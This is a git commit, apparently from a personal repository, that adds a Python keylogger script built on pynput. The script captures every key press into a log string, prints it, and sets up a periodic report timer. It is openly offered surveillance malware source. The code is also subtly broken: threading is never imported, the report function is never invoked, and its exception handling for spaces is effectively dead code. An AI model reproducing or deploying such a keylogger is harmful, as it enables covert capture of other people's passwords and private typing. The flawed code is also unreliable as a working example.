4c2382f03dc71bd505fe6ddbeeb3e49e6a92cc63
probablyhamzah <probablyhamzah@gmail.com>
2022-02-17 13:18:54 +0300

    added keyloggers

---
+++ python/keylogger3.py
@@ -0,0 +1,25 @@
+import pynput.keyboard
+
+log = ""
+
+def process_key_press(key):
+    global log
+    try:
+        log = log + str(key)
+    except:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + " " + str(key) + " "
+        print(log)
+
+def report():
+    global log
+    print(log)
+    log = ""
+    timer = threading.Timer(5, report)
+    timer.start()
+
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+with keyboard_listener:
+    keyboard_listener.join()
